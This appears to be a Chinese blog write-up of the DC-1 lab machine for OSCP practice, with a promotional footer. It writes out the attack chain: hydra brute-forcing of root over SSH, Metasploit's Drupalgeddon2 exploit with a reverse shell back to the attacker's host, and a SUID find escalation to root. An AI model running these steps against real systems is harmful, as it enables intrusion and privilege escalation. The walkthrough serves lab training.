# 原创
：  OSCP系列靶场-Esay-DC-1

# OSCP系列靶场-Esay-DC-1

**目录**

[总结](#%E6%80%BB%E7%BB%93)

[准备工作](#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C)

[信息收集-端口扫描](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F)

[目标开放端口收集](#%E7%9B%AE%E6%A0%87%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E6%94%B6%E9%9B%86)

[目标端口对应服务探测](#%E7%9B%AE%E6%A0%87%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%BA%94%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B)

[信息收集-端口测试](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95)

[22-SSH端口的信息收集](#22-SSH%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[22-SSH端口版本信息与MSF利用(pass)](#22-SSH%E7%AB%AF%E5%8F%A3%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%E4%B8%8EMSF%E5%88%A9%E7%94%A8%28pass%29)

[22-SSH手动登录尝试(失败)](#22-SSH%E6%89%8B%E5%8A%A8%E7%99%BB%E5%BD%95%E5%B0%9D%E8%AF%95%28%E5%A4%B1%E8%B4%A5%29)

[22-SSH弱口令爆破(爆破着玩)](#22-SSH%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%28%E7%88%86%E7%A0%B4%E7%9D%80%E7%8E%A9%29)

[80-HTTP端口的信息收集](#80-HTTP%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[信息收集-网站指纹](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9)

[漏洞利用-网站指纹](#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9)

[其他端口的信息收集](#%E5%85%B6%E4%BB%96%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[漏洞利用-getwebshell](#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-getwebshell)

[内网遨游-getshell](#%E5%86%85%E7%BD%91%E9%81%A8%E6%B8%B8-getshell)

[交互shell](#%E4%BA%A4%E4%BA%92shell)

[FLAG1获取](#FLAG1%E8%8E%B7%E5%8F%96)

[权限提升](#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87)

[Linux提权-sudo提权尝试(失败)](#Linux%E6%8F%90%E6%9D%83-sudo%E6%8F%90%E6%9D%83%E5%B0%9D%E8%AF%95%28%E5%A4%B1%E8%B4%A5%29)

[Linux提权-suid提权尝试](#Linux%E6%8F%90%E6%9D%83-suid%E6%8F%90%E6%9D%83%E5%B0%9D%E8%AF%95)

[FLAG2获取](#FLAG2%E8%8E%B7%E5%8F%96)

---


### 总结

getwebshell → 发现`CMS` → `MSF`远程反弹`SHELL`

提 权 思 路 → 发现`SUID`-`FIND` → `FIND`提权

### 准备工作

### 信息收集-端口扫描

#### 目标开放端口收集

```
sudo nmap -sU --min-rate 10000 -p- 192.168.223.193
```

<br/> 通过两次收集到的端口:`→22,80,111,46232,53990`

#### 目标端口对应服务探测

通常`udp`端口测不出啥，主要探测`tcp`

```
# tcp探测

sudo nmap -sT -sV -O -sC -p22,80,111,46232,53990 192.168.223.193
```

### 信息收集-端口测试

#### 22-SSH端口的信息收集

##### 22-SSH端口版本信息与MSF利用(pass)

通过`Nmap`探测获得SSH的版本信息，可以尝试利用<br/>`22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)`

```

# 进入msf OpenSSH 6.0p1

msfconsole

# 搜索对应脚本

msf6 &gt; searchsploit openssh 6.0p1
```

##### 22-SSH手动登录尝试(失败)

尝试`root`账户的密码爆破发现报错之后进行手动尝试

```
ssh root@192.168.223.193 -p 22

# 密码尝试

password &gt; root
```

说明支持密码登录，但是密码不对

##### 22-SSH弱口令爆破(爆破着玩)

尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

```
hydra -l root -P /usr/share/wordlists/metasploit/password.lst -t 6 -vV 192.168.223.193 ssh -s 22
```

在等待结果的同时让我们尝试使用另外的信息收集

#### 80-HTTP端口的信息收集

访问 http://192.168.223.193:80 发现是一个有名的`CMS`

##### 信息收集-网站指纹

```
whatweb -v http://192.168.223.193:80
```

确认了`CMS`的版本信息 `Drupal 7`

##### 漏洞利用-网站指纹

既然确定了版本，直接上工具

```
msfconsole



searchsploit Drupal 7
```

查看了一下

#### 其他端口的信息收集

不需要啦~

### 漏洞利用-getwebshell

觉得还是远程执行的`exp`比较好

```
search Drupal 7

&gt;use exploit/unix/webapp/drupal_drupalgeddon2
```

选一个时间靠后并且`Rank`比较高的

```
# 感觉只要设置攻击机以及监听端口，还有目标机器

show options
```

```
# 感觉只要设置攻击机以及监听端口，还有目标机器

show options
```

```
# 设置个反弹shell

show payloads

set payload 3
```

```

# 配置MSF

set lhost 192.168.45.208

set lport 5555

set rhosts 192.168.230.193

set rport 80

run
```

成功`getwebshell`

### 内网遨游-getshell

#### 交互shell

由于获取的`shell`交互不友好，使用`shell`先获取`shell`

```
# 利用shell命令获取shell

meterpreter &gt; shell

Process 4192 created.

Channel 0 created.

pwd

/var/www

whoami

www-data

# 利用python获取交互shell -&gt; python失败使用python3

python -c "import pty;pty.spawn('/bin/bash')";

www-data@DC-1:/var/www$
```

#### FLAG1获取​​​​​​​

```
www-data@DC-1:/var/www$ find / -name local.txt 2&gt;/dev/null

find / -name local.txt 2&gt;/dev/null

/home/local.txt

www-data@DC-1:/var/www$ cat /home/local.txt

cat /home/local.txt

******************
```

#### 权限提升

##### Linux提权-sudo提权尝试(失败)

查找具有`sudo`权限，且不需要密码的可提权文件​​​​​​​

```
# 利用sudo -l寻找

sudo -l
```

#### Linux提权-suid提权尝试​​​​​​​

```
# -perm 文件权限

find / -perm -u=s -type f 2&gt;/dev/null
```

<br/> 如果发现有东西的话 访问 https://gtfobins.github.io 寻找

```
# 查找文件提权

find . -exec '/bin/sh' \;
```

提权成功

#### FLAG2获取​​​​​​​

```
# cat /root/proof.txt

cat /root/proof.txt

****************
```

完结撒花~

> 
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.


**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/9c2089d20ced4b9b99981bb412b53eec.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/eb7d36c02c454150bf2ff4097712467c.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/40fb1c507b324a6ea81f042b049abf9b.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/7a3bb8c8d4894755b18059fd1d836678.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/a3a87d16a8e34bef92f2e1fd8c2506c8.png" width="665"/>

应急响应笔记

学习路线
